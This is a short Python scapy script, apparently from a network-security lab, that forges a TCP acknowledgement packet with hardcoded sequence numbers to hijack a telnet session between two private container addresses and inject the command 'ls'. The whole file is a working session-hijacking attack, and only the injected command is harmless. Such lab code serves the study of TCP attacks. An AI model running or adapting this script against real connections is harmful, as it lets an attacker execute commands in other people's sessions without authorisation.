#!/usr/bin/python3
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")
ip = IP(src="172.17.0.2", dst="172.17.0.3")
tcp = TCP(sport=51756, dport=23, flags="A", seq=3581025435, ack=1190321684)
data = "\rls\r"
pkt = ip/tcp/data
send(pkt, verbose=0)